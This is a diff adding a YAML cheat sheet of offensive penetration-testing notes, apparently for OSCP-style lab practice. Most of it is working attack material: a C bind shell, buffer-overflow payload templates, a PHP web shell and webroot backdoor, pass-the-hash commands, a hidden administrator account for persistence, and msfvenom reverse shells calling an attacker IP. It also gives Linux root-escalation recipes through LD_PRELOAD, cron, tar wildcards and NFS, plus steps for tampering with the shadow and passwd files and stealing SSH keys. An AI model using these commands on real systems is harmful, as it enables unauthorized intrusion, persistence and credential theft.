@@ -1,0 +1,2302 @@
+meta:
+  lastupdate: 20200625
+  sources:
+    - https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/
+    - https://jivoi.github.io/2015/08/21/pentest-tips-and-tricks-number-2/
+    - https://github.com/DigitalAftermath/EnumerationVisualized/
+
+  methodology:
+    recon:
+      goal: to scan all ports on <targetip>
+      process:
+        - "[enumerate_nmap_initial](https://github.com/7h3rAm/writeupsall/blob/master/readme.md#enumerate_nmap_initial)"
+        - "[enumerate_nmap_tcp](https://github.com/7h3rAm/writeupsall/blob/master/readme.md#enumerate_nmap_tcp)"
+        - "[enumerate_nmap_udp](https://github.com/7h3rAm/writeupsall/blob/master/readme.md#enumerate_nmap_udp)"
+    enumerate:
+      goal: to find service and version details
+      process:
+        - find ttps for open ports
+        - start with weird services
+        - identify installed software and version
+        - find critical cve/exploits
+        - enumerate more common services - smb/ftp
+        - enumerate services with large attack vector like http at the end
+    exploit:
+      goal: gain interactive access on <targetip>
+      process:
+        - debug available exploits for open ports
+    privesc:
+      goal: gain elevated privileges on <targetip>
+      process:
+        - debug available exploits or misconfigurations
+        - for nix, use linux smart enum (lse) - https://github.com/diego-treitos/linux-smart-enumeration
+        - for windows, use winpeas - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
+  tips:
+    - description: oscp practise
+      cli: |
+        https://github.com/ajdumanhug/oscp-practice
+
+    - description: tmux shortcuts
+      cli: |
+        prefix: ctrl + b
+        toggle logging: prefix + shift + p
+        screen cap: prefix + alt + p
+        complete history: prefix + alt + shift + p
+
+    - description: shell shortcuts
+      cli: |
+        machinescli: update local stats for htb|vh|oscplike|owned machines, query stats, search for ippsec writeups or vh description, track owned|oscplike machines
+        svachal: writeups manager, can start|finish|rebuild|summarize writeups, auto updates readme and metanotes md files, auto creates ttps csv for openports|ttps shortcuts
+        openports: shows open ports from autorecon|manual scan results
+        ttps: shows ttps for open ports, can find both suggested and itw ttps
+
+    - description: bind shell
+      cli: |
+        bs.c
+        #include <sys/socket.h>
+        #include <netinet/in.h>
+        #include <stdlib.h>
+        #include <unistd.h>
+        int main(int argc, char* argv[]) {
+          int host_sock = socket(AF_INET, SOCK_STREAM, 0);
+          struct sockaddr_in host_addr;
+          host_addr.sin_family = AF_INET;
+          host_addr.sin_port = htons(atoi(argv[1]));
+          host_addr.sin_addr.s_addr = INADDR_ANY;
+          bind(host_sock, (struct sockaddr *)&host_addr, sizeof(host_addr));
+          listen(host_sock, 0);
+          int client_sock = accept(host_sock, NULL, NULL);
+          dup2(client_sock, 0);
+          dup2(client_sock, 1);
+          dup2(client_sock, 2);
+          execve("/bin/bash", NULL, NULL);
+        }
+        gcc -m32 -o bs bs.c
+        ./bs 4444
+    - description: buffer overflow
+      category:
+        - ttp
+      cli: |
+        payload = "\x41" * <length> + <ret_address> + "\x90" * 16 + <shellcode> + "\x43" * <remaining_length>
+        pattern create: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <attackerport>
+        pattern offset: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <attackerport> -q <address>
+        nasm: /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+        nasm > jmp eax
+        bad characters:
+        badchars = (
+        "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
+        "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+        "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
+        "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+        "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
+        "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
+        "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
+        "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
+        "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
+        "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
+        "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
+        "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
+        "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
+        "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
+        "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
+        "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
+        find address for "jmp esp" using mona.py:
+        !mona jmp -r esp -b <list of bad chars>
+        gcc compilation options:
+        linux: gcc -m32 -Wl,--hash-style=both 9542.c -o 9542
+          -wl,--hash-style=both: linker option to enable both gnu and sysv style hashtable support
+        references:
+        https://github.com/s0wr0b1ndef/OSCP-note/blob/master/Buffer_overflow/info.txt
+        https://github.com/justinsteven/dostackbufferoverflowgood/blob/master/dostackbufferoverflowgood_tutorial.md
+    - description: file transfers
+      cli: |
+        certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip
+        powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<targetip>/file.exe','C:\Users\user\Desktop\file.exe')"
+        python3 -m pyftpdlib -p 21
+        rdesktop <targetip> -r disk:remotedisk=/usr/share/windows-binaries
+        gzip+xxd:
+        sender:
+          gzip -c < file > file.gz
+          xxd -p file.gz | tr -d '\n' && echo
+        receiver:
+          echo 1f8b...0000 > /tmp/file.gz.hex
+          xxd -p -r < /tmp/file.gz.hex > /tmp/file.gz
+          gunzip -c < /tmp/file.gz > /tmp/file
+        automate file download via windows ftp client:
+        echo open <targetip> >ftp_commands.txt
+        echo anonymous >>ftp_commands.txt
+        echo whatever >>ftp_commands.txt
+        echo binary >>ftp_commands.txt
+        echo get met8888.exe >>ftp_commands.txt
+        echo bye >>ftp_commands.txt
+        ftp -s:ftp_commands.txt
+        create wget.vbs and download netcat:
+        >C:\Windows\d.vbs
+        echo strUrl = WScript.Arguments.Item(0)  >>C:\Windows\d.vbs
+        echo StrFile = WScript.Arguments.Item(1)  >>C:\Windows\d.vbs
+        echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0  >>C:\Windows\d.vbs
+        echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0  >>C:\Windows\d.vbs
+        echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1  >>C:\Windows\d.vbs
+        echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2  >>C:\Windows\d.vbs
+        echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts  >>C:\Windows\d.vbs
+        echo Err.Clear  >>C:\Windows\d.vbs
+        echo Set http = Nothing  >>C:\Windows\d.vbs
+        echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1")  >>C:\Windows\d.vbs
+        echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")   >>C:\Windows\d.vbs
+        echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")   >>C:\Windows\d.vbs
+        echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")  >>C:\Windows\d.vbs
+        echo http.Open "GET", strURL, False  >>C:\Windows\d.vbs
+        echo http.Send  >>C:\Windows\d.vbs
+        echo varByteArray = http.ResponseBody  >>C:\Windows\d.vbs
+        echo Set http = Nothing  >>C:\Windows\d.vbs
+        echo Set fs = CreateObject("Scripting.FileSystemObject")  >>C:\Windows\d.vbs
+        echo Set ts = fs.CreateTextFile(StrFile, True)  >>C:\Windows\d.vbs
+        echo strData = ""  >>C:\Windows\d.vbs
+        echo strBuffer = ""  >>C:\Windows\d.vbs
+        echo For lngCounter = 0 to UBound(varByteArray)  >>C:\Windows\d.vbs
+        echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1)))  >>C:\Windows\d.vbs
+        echo Next  >>C:\Windows\d.vbs
+        echo ts.Close >>C:\Windows\d.vbs
+        dir C:\Windows\d.vbs
+        C:\Windows\d.vbs "http://<targetip>/nc.exe" C:\Windows\nc.exe
+        netcat:
+        nc -w3 <targetip> 1234 <file.sent
+        cmd /c nc.exe -l -v -p 1234 >file.rcvd
+        smb (139/tcp, 445/tcp):
+        server: python smbserver.py -smb2support shared $HOME/toolbox/scripts/shared
+          copy ntlm/lm hashes submitted by windows clients during transfers and crack via jtr/hashcat
+        client:
+          list files: smbclient -L <targetip> --no-pass
+          list files: net view \\<targetip>
+          list files: dir \\<targetip>\shared
+          copy files: copy \\<targetip>\shared\met8888.exe
+          execute files: \\<targetip>\shared\met8888.exe
+        tftp (69/udp):
+        server:
+          atftpd --daemon --port 69 $HOME/toolbox/scripts/shared
+          metasploit:
+            use auxiliary/server/tftp
+            set TFTPROOT $HOME/toolbox/scripts/shared
+            exploit
+        client:
+          download: tftp -i <targetip> GET met8888.exe
+          upload: tftp -i <targetip> PUT hashes.txt
+          install: pkgmgr /iu:"TFTP"
+    - description: heartbleed
+      cli: |
+        nmap --script=ssl-heartbleed -p <targetport> <targetip>
+        https://github.com/sensepost/heartbleed-poc
+        python $HOME/toolbox/scripts/heartbleed-poc/heartbleed-poc.py -n10 -f dump.bin <targetip> -p <targetport>
+        strings dump.bin
+    - description: iptables
+      cli: |
+        config file: /etc/iptables/rules.v4
+    - description: lfi/rfi/image upload
+      cli: |
+        https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI
+        uniscan -u http://<targetip>/ -qweds
+        wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://<targetip>/FUZZ
+        https://snowscan.io/htb-writeup-friendzone/
+        php://filter/convert.base64-encode/resource=<pagename>
+        http://zerofreak.blogspot.com/2012/04/lfi-exploitation-via-phpinput-shelling.html
+        php command execution: <? passthru($_GET[cmd]) ?>
+        bypass upload filter:
+          change extension to PHP, PHP3, PHP4, PHP5
+          add magic bytes to start of file (eg: GIF87 to a php shell) to evade upload filters
+        https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/
+        local file access: http://<targetip>/?page=php://filter/convert.base64-encode/resource=index
+        notice urls that accept a generic filename as parameter: ?page=file1.php
+        ?page=../../../../../../etc/passwd
+        ?page=../../../../../../windows/system32/drivers/etc/hosts
+        ippsec steps (htb.beep: https://youtu.be/XJmBpOd__N8) :
+        /etc/passwd
+        /proc/self/status
+        find home username in passwd, locate home directory for user
+        /var/lib/asterisk/.ssh/id_rsa
+    - description: passthehash
+      cli: |
+        fgdump.exe
+        /usr/bin/pth-winexe -U administrator%0182BD0BD4444BF836077A718CCDF409:259745CB123A52AA2E693AAACCA2DB52 //<targetip> cmd.exe
+        wmiexec.exe -hashes 0182BD0BD4444BF836077A718CCDF409:259745CB123A52AA2E693AAACCA2DB52 administrator@localhost
+    - description: passwords
+      cli: |
+        shadow file structure: $id$salt$password
+        generate shadow file hash:
+        mkpasswd -m md5 password salt
+        mkpasswd -m sha-256 password salt
+        mkpasswd -m sha-512 password salt
+    - description: persistence
+      cli: |
+        windows:
+        add a new administrator user:
+          net user anderson cooper /add && net localgroup administrators anderson /add
+        add user to rdp group:
+          net localgroup "Remote Desktop Users" anderson /add
+        enable rdp in firewall:
+          netsh firewall add portopening TCP 3389 "RDP"
+        enable rdp via registry (requries reboot):
+          reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+        is rdp service running:
+          tasklist /svc | findstr /c:TermService
+        start rdp service:
+          net start TermService
+        permanently enable rdp service:
+          sc config TermService start=auto
+        useradd.c
+          #include <stdlib.h>
+          int main() {
+            int i;
+            i=system("net user anderson cooper /add && net localgroup administrators anderson /add");
+            return 0;
+          }
+        windows - add user:
+          #include <stdlib.h> /* system, NULL, EXIT_FAILURE */
+          int main() {
+            int i;
+            i=system("net user anderson cooper /add && net localgroup administrators anderson /add");
+            return 0;
+          }
+          # compile: i686-w64-mingw32-gcc -o useradd.exe useradd.c
+    - description: port forward
+      cli: |
+        socat tcp-listen:8080,fork,reuseaddr tcp:127.0.0.1:80 &
+        socat tcp-listen:8065,fork,reuseaddr tcp:127.0.0.1:65334 &
+    - description: portknock
+      cli: |
+        knock once on port 8080/tcp:
+        hping3 <targetip> -S -p 8080 -c 1
+        nc -vvvz <targetip> 8080
+        knock on multiple tcp ports in a given sequence:
+        hping3 <targetip> -S -p 666 -c 1; hping3 <targetip> -S -p 7000 -c 1; hping3 <targetip> -S -p 8890 -c 1
+        nmap -Pn -sT -r -p666,7000,8890 <targetip>
+      references:
+        - https://blog.knapsy.com/blog/2014/10/16/knock-knock-vm-walkthrough/
+        - https://highon.coffee/blog/fartknocker-walkthrough/
+    - description: privesc
+      cli: |
+        lpeworkshop (https://github.com/sagishahar/lpeworkshop) and lpe course (https://www.udemy.com/course/linux-privilege-escalation/):
+        linux:
+          id ; whoami ; uname -a ; w ; lsb_release -a
+          enumerate:
+            tools:
+            lse.sh:
+              ./lse.sh -l2 # show all gathered info
+              ./lse.sh -l2 -c # disable colors
+            linenum.sh
+            linux-exploit-suggester-2.pl # kernel exploitation
+            misc techniques (https://twitter.com/JaneScott_/status/1144134954353217536):
+            find /var/www -xdev -perm -o+w -ls ; echo "<?php passthru($_GET['cmd']); ?>" > /var/www/<output from first command>/backdoor.php
+            ./unix-privesc-check detailed && find / -xdev -perm -u+s -type f -ls && find / -xdev -perm -o+w -ls
+            wget https://raw.githubusercontent.com/zMarch/Orc/master/o.rc && ENV=o.rc sh -i "gethelp"
+            w;uname -a;lsb_release -a
+            find -O3 / -perm -u=s -type f -ls 2>/dev/null
+            cat /home/*/.ssh/id_rsa
+            history ; find / -perm -4000 -exec ls -l {} \;
+            find / -type f -mmin -60 -ls 2>/dev/null # find recently modified files; can use pspy alternatively
+          spawn root shell:
+            suid bash:
+            create a copy of /bin/bash, make sure it is owned by root user and has suid bit set. this is a persistent method and can be used to gain root privileges on demand using the -p flag at invocation
+            custom executable:
+            if we control a process that gets executed by a root process (eg: cron jobs), use the following code to create a custom binary for the initial process under our control:
+              int main(){setuid(0);system("/bin/bash -p");}
+              gcc -o rootbash rootbash.c
+            msfvenom can also be used in case a reverse shell is desired (use netcat or multi/handler to catch incoming connection):
+              msfvenom-p linux/x86/shell_reverse_tcpLHOST=<attackerip> LPORT=<attackerport> -f elf >rootbash
+          kernel:
+            manual:
+            $ uname -a
+              Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux
+            # searchsploit linux kernel 2.6.32 priv esc debian
+            # linux-exploit-suggester-2.pl -k 2.6.32
+            dirtycow:
+            affected kernel versions: 2.6.22 < 4.8.3
+            https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
+            https://www.exploit-db.com/exploits/40839
+              gcc -pthread -lcrypt -o 40839 40839.c
+              ./40839 # enter password when prompted, press ctrl+c if needed
+              su <username>
+            https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54
+              gcc -pthread c0w.c -o c0w
+              ./c0w
+              /usr/bin/passwd
+            vmsplice:
+            https://www.exploit-db.com/exploits/5092
+          service:
+            manual:
+            find services running as root:
+              $ ps aux | grep "^root"
+            find program version:
+              $ <program> --version
+              $ <program> -v
+              $ dpkg -l | grep <program>
+              $ rpm -qa | grep <program>
+            apache2:
+            sudo -l => shows apache2 can be run as sudo
+            sudo apache2 -f /etc/shadow => will throw an error upon reading the first line of shadow file and dump hash on stdout, copy it to a file
+            john --format=crypt --wordlist=/usr/share/wordlists/nmap.lst hash
+            exim:
+            dpkg -l | grep -i exim => version <4.86.2
+            exim -bV -v | grep -i perl => compiled with perl support
+            head /etc/exim.conf => configuration has perl_startup option
+            ./cve_2016-1521.sh
+            lxd:
+            check output of id command
+            if user member of lxd group, follow https://reboare.github.io/lxd/lxd-escape.html
+            mysqld:
+            when mysql is running as root
+            mysql has ability to install uder defined functions which run via shared objects
+            use [edb:1518](https://www.exploit-db.com/exploits/1518)
+            once exploit is complete, do the following:
+              mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod+s /tmp/rootbash');
+              mysql> exit
+              $ /tmp/rootbash -p
+              rootbash-4.1# id
+                uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+            strace:
+            https://gtfobins.github.io/gtfobins/strace/
+            write a c program to run bin/bash and strace it: https://hackso.me/lin.security-1-walkthrough/
+            udev:
+            netlink:
+                https://www.exploit-db.com/exploits/8478
+                affected udev versions: <1.4.1
+                cat /proc/net/netlink
+                select pid for group "ffffffff"
+            port forwarding:
+            if the root process is bound to an internal port and for some reason we cannot run the exploit locally, use port forwarding via ssh:
+            $ ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>
+          weak file permissions:
+            important commands:
+            $ find /etc -maxdepth 1 -writable -type f
+            $ find /etc -maxdepth 1 -readable -type f
+            $ find / -executable -writable -type d 2> /dev/null
+            /etc/shadow file:
+            if we have read permissions, use it to extract password and crack it:
+              # echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt'
+              # john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+              $ su
+            if we have write permissions, use it to edit entry for root password hash we know:
+              $ cp /etc/shadow /tmp/shadow.bck
+              # mkpasswd-m sha-512 <newpassword>
+              $ echo -en "root:$6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoOlL9VEWwO/okK3vi1IdVaO9.xt4IQMY4OUj/:17298:0:<attackerport>9:7:::" >>/etc/shadow
+              $ su
+            /etc/passwd file:
+            hash within passwd file takes precedence over hash in shadow file
+            if we can only append, create a uid 0 entry for a new user (linux allows multiple users with different names to have uid 0)
+              $ cp /etc/passwd /tmp/passwd.bck
+              $ openssl passwd "newpassword"
+              $ echo -en "newroot:SkZvJDdq90GJw:0:0:root:/root:/bin/bash" >>/etc/passwd
+              $ su newroot
+            backups:
+            backups of sensitive files can prove useful when those files themselves are not accessible
+            look for readable files within below directories:
+              ls -la / /home/* /tmp/ /var/backups
+            if we have read permission for .ssh directory, check if we can ssh as root and then if we can, copy .ssh/id_rsa to your system:
+              $ grep PermitRootLogin /etc/ssh/sshd_config
+              # chmod 600 id_rsa
+              # ssh -i id_rsa root@<targetip>
+          sudo:
+            list allowed programs:
+            sudo -l
+            if user is member of sudo group and user password is available:
+            sudo su
+            other methods:
+            sudo -s
+            sudo -i
+            sudo /bin/bash
+            sudo passwd
+            shell escape sequences:
+            https://gtfobins.github.io/
+            sudo -l:
+              awk: sudo awk 'BEGIN {system("/bin")}'
+              find: sudo find /bin -name nano -exec /bin/sh \;
+              vim: sudo vim -c '!sh'
+              nmap:
+                non-interactive: echo "os.execute('/bin/sh')" >shell.nse && sudo nmap --script=shell.nse
+                interactive:
+                nmap --interactive
+                  > !sh
+            abuse intended functionality:
+            if escape sequneces don't work, we can still leverage sudo privs to read/write root owned files
+            apache2:
+              $ sudo -l
+                ...(root) NOPASSWD: /usr/sbin/apache2
+              $ sudo apache2 -f /etc/shadow
+                Syntax error on line 1 of /etc/shadow:
+                Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:<attackerport>9:7:::', perhaps misspelled or defined by a module not included in the server configuration
+              $ echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' >hash.txt'
+              $ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+              $ su
+            env_keep:
+            programs run through sudo can inherit environment variables, if env_keep option is set. they won't if env_reset is set. can be checked via "sudo -l"
+            LD_PRELOAD:
+              an environment variable which can be set to the path of a shared object (.so) file
+              when set, the shared object will be loaded before any others
+              creating a custom shared object and creating an init() function, we can execute code as soon as the object is loaded
+              LD_PRELOAD doesn't work if ruid != euid
+              sudo must be configured to preserve LD_PRELOAD via env_keep
+                $ sudo-l
+                Matching Defaults entries for user on this host:
+                env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+              create a preload.c file:
+                #include <stdio.h>
+                #include <sys/types.h>
+                #include <stdlib.h>
+                void _init(){unsetenv("LD_PRELOAD");setresuid(0,0,0);system("/bin/bash -p");}
+                $ gcc -fPIC -shared -nostartfiles-o /tmp/preload.so preload.c
+                $ sudo LD_PRELOAD=/tmp/preload.so apache2
+                # id
+                uid=0(root) gid=0(root) groups=0(root)
+            LD_LIBRARY_PATH:
+              an environment variable that contains a set of directories where shared libraries are searched for first
+              the ldd command can be used to print the shared libraries used by a program:
+                $ ldd /usr/sbin/apache2
+              by creating a shared library with the same name as one used by a program, and setting LD_LIBRARY_PATH to its parent directory, the program will load our shared library instead
+              sudo must be configured to preserve LD_LIBRARY_PATH via env_keep
+                $ sudo-l
+                Matching Defaults entries for user on this host:
+                env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+              create a library_path.c file:
+                #include <stdio.h>
+                #include <stdlib.h>
+                static void hijack() __attribute__((constructor));void hijack(){unsetenv("LD_LIBRARY_PATH");setresuid(0,0,0);system("/bin/bash -p");}
+                $ gcc-o libcrypt.so.1 -shared -fPIC library_path.c
+                $ sudo LD_LIBRARY_PATH=. apache2
+                # id
+                uid=0(root) gid=0(root) groups=0(root)
+          cron:
+            user cronjobs are stored in /var/spool/cron/ or /var/spool/cron/crontabs/ , system cronjobs are stored in /etc/crontab
+            file overwrite:
+            $ cat /etc/crontab => overwrite.sh is run as root and is world writable
+            $ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >>/usr/local/bin/overwrite.sh
+            $ /tmp/bash -p => can use /bin/sh as well
+            # id
+            path:
+            useful when a cronjob doesn't use absolute path for a program and one of the path directories is writable
+            $ cat /etc/crontab => $PATH has /home/user as the first search location and overwrite.sh is called without it's absolute path
+            $ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >>/home/user/overwrite.sh
+            $ /tmp/bash -p => can use /bin/sh as well
+            # id
+            wildcards:
+            $ cat /etc/crontab => compress.sh is run as root and is world readable
+            $ cat /usr/local/bin/compress.sh => tar command uses a shell wildcard within /home/user directory
+            $
+            $ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >/home/user/runme.sh
+            $ touch /home/user/--checkpoint=1
+            $ touch /home/user/--checkpoint-action=exec=sh\ runme.sh
+            $ /home/user/bash -p
+            # id
+            OR
+            $ msfvenom-p linux/x64/shell_reverse_tcpLHOST=<IP> LPORT=53 -f elf -o shell.elf
+            $ touch /home/user/--checkpoint=1
+            $ touch /home/user/--checkpoint-action=exec=shell.elf
+            # nc -nlvp 53
+          suid/sgid binaries:
+            find suid/sgid binaries:
+            $ find / -type f -a \( -perm -u+s-o -perm -g+s\) -exec ls -l {} \; 2> /dev/null
+            shell escape sequences:
+            https://gtfobins.github.io/
+            sudo -l:
+              awk: sudo awk 'BEGIN {system("/bin")}'
+              find: sudo find /bin -name nano -exec /bin/sh \;
+              vim: sudo vim -c '!sh'
+              nmap:
+                non-interactive: echo "os.execute('/bin/sh')" >shell.nse && sudo nmap --script=shell.nse
+                interactive:
+                nmap --interactive
+                  > !sh
+            LD_PRELOAD/LD_LIBRARY_PATH:
+            both these environment variables are ignored for suid/sgid files by default in linux for security reasons
+            known exploits:
+            certain programs create suid files that can be exploited
+            exim:
+              $ find / -type f -a \( -perm -u+s-o -perm -g+s\) -exec ls -l {} \; 2> /dev/null
+                ...
+                -rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
+                ...
+              $ /usr/sbin/exim-4.84-3 --version
+                Exim version 4.84 #3 built 13-May-2017 01:45:35
+              # searchsploit exim 4.84
+                ...
+                Exim 4.84-3 - Local Privilege Escalation | exploits/linux/local/39535.sh
+              $ ./privesc.sh
+                [ CVE-2016-1531 local root exploit
+              # id
+                uid=0(root) gid=1000(user) groups=0(root)
+            shared object injection:
+            $ find / -type f -perm -04000 -ls 2>/dev/null => note all suid binaries
+            $ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file" => one of the suid binaries is missing a shared object in a writable location
+              #include <stdio.h>
+              #include <stdlib.h>
+              static void inject() __attribute((constructor));
+              void inject(){system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");}
+            $ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/.config/libcalc.c => create a custom shared object for missing file
+            $ /usr/local/bin/suid-so => run suid binary to get root shell
+            # id
+            path environment variable:
+            look for vulnerable programs:
+              $ strings /path/to/file
+              $ strace -v -f -e execve <command> 2>&1 | grep exec
+              $ ltrace <command>
+            search for suid binaries:
+              $ find / -type f -perm -04000 -ls 2>/dev/null
+            look for strings within a suid binary, this one calls "service apache2 start", service doesn't have absolute path:
+              $ strings /usr/local/bin/suid-env
+            create a dummy service binary to gain root shell:
+              $ echo 'int main(){setgid(0);setuid(0);system("/bin/bash -p");return 0;}'>/tmp/service.c
+            compile dummy service binary and place in /tmp directory:
+              $ gcc /tmp/service.c -o /tmp/service
+            update path to load service from /tmp first:
+              $ export PATH=/tmp:$PATH
+            run suid binary to gain root shell:
+              $ /usr/local/bin/suid-env
+              # id
+            abusing shell features #1:
+            some shells (notably Bash <4.2-048) it is possible to define user functions with an absolute path name
+            these functions can be exported so that subprocesses have access to them, and the functions can take precedence over the actual executable being called
+            search for suid binaries:
+              $ find / -type f -perm -04000 -ls 2>/dev/null
+            look for strings within a suid binary, this one calls "/usr/sbin/service apache2 start":
+              $ strings /usr/local/bin/suid-env2
+            create a shell function with name equal to absolute path of service binary:
+              $ function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+            export function:
+              $ export -f /usr/sbin/service
+            run suid binary to gain root shell:
+              $ /usr/local/bin/suid-env2
+              # id
+            abusing shell features #2:
+            the Bash shell has a debugging mode which can be enabled with the -x command line option, or by modifying the SHELLOPTS environment variable to include xtrace
+            by default, SHELLOPTS is read only, however the env command allows SHELLOPTS to be set
+            when in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debug statements
+            this variable can include an embedded command, which will execute every time it is shown
+            if an SUID file runs another program via Bash (e.g. by using system()) these environment variables can be inherited
+            if an SUID file is being executed, this command will execute with the privileges of the file owner
+            in Bash versions 4.4 and above, the PS4 environment variable is not inherited by shells running as root
+            $ env -i SHELLOPTS=xtrace PS4='$(/cp /bin/bash /tmp && chown root:root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
+            # id
+            symlink:
+            https://www.exploit-db.com/exploits/40768
+            $ dpkg -l | grep nginx => nginx version is <1.6.2-5+deb8u3
+            $ su -l www-data => need to www-data for exploit to work
+            $ /home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log => exploit script
+              wait for logs to rotate, to speed up the process:
+                ssh user@192.168.92.162
+                su
+                invoke-rc.d nginx rotate >/dev/null 2>&1
+            # id
+          password and keys:
+            password reuse can be an easy way to priv esc (service files leaking password that is reused for system root account)
+            history files:
+            $ cat $HOME/.*history | less
+              ls -al
+              cat .bash_history
+              ls -al
+              mysql-h somehost.local -uroot -ppassword123
+            $ su
+            # id
+            config files:
+            $ ls
+              myvpn.ovpn tools
+            $ cat myvpn.ovpn
+              ...
+              auth-user-pass /etc/openvpn/auth.txt
+              ...
+            $ cat /etc/openvpn/auth.txt
+              root
+              password123
+            $ su
+            # id
+            ssh keys:
+            copy .ssh/id_rsa to local system
+            $ grep PermitRootLogin /etc/ssh/sshd_config
+            # chmod 600 id_rsa
+            # ssh -i id_rsa root@<targetip>
+          nfs:
+            check available mountpoints:
+            # nmap -sV -script=nfs-showmount <targetip>
+            OR
+            $ cat /etc/exports => / *(rw,no_root_squash)
+            $ cat /etc/exports => /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+            steps:
+            # showmount -e 192.168.92.162
+            # mkdir /tmp/lpe
+            # mount -o rw,vers=2 192.168.92.162:/tmp /tmp/lpe/
+            # echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' >/tmp/lpe/shell.c
+            # gcc -o /tmp/lpe/shell /tmp/lpe/shell.c 
+            # chmod +s /tmp/lpe/shell
+            # ls -l /tmp/lpe/
+            $ /tmp/shell
+            # id
+            root squashing:
+            allows nfs to squash root user privs to avoid privesc
+            can be disabled using the no_root_squash option within config
+          misc:
+            chkrootkit:
+            create a file /tmp/update with commands for lpe
+            make /tmp/update executable
+            wait for chkrootkit to execute as part of cronjob
+            ssh knownhosts:
+            sometimes there could be a 127.0.0.1 entry within a non-root user's known_hosts file
